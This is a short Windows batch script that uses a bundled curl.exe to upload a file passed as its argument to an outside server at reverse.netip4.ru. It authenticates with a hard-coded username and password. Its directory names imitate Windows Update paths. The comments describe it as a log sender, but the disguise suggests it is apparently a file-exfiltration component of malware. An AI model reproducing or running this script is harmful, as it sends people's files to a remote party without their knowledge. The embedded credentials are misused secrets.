@echo off
rem *******************************************************
rem sendRun.TinySend.cmd
rem This File Sends a Log File(s) to Server
rem
rem  PARAMETERS: %1 is a Sent File
rem RETURNS:	0 (USUALLY)
rem		1 if check integrity error
rem *******************************************************
@echo off

rem
rem Set CURLEXE ....
set CURLEXE=%~dp0CURL.EXE
rem Check if files Exist
rem
if not exist %CURLEXE% echo %CURLEXE% is not found && exit /b 1
rem
rem Set localFile...
set localfile=%1

rem Initialization Download Variables
rem
set http_pref001=http
set http_host001=file.netip4.ru
set http_port001=80
set http_dir0001=/WinUpdate/
set http_dir0000=/Exponenta/
set http_dir0003=/WinUpdate/WindowsMainUpdate/Other/
set http_echodir=/WinUpdate/InitialCommon/
set http_pref002=http
set http_host002=reverse.netip4.ru
set http_port002=80
set http_dir0000=/tmp/Files/Reboot/
set http_user001=MSSQLSR
set http_pass001=Admin01234

rem Derivatives Variables
set host=%http_pref002%://%http_host002%:%http_port002%%http_dir0000%
echo host = %host%
echo Local Folder = %~dp0

rem Send Local File...
rem
rem upload File to server
rem
"%CURLEXE%" -T %localfile% %host% -u %http_user001%:%http_pass001% --verbose

exit /b 0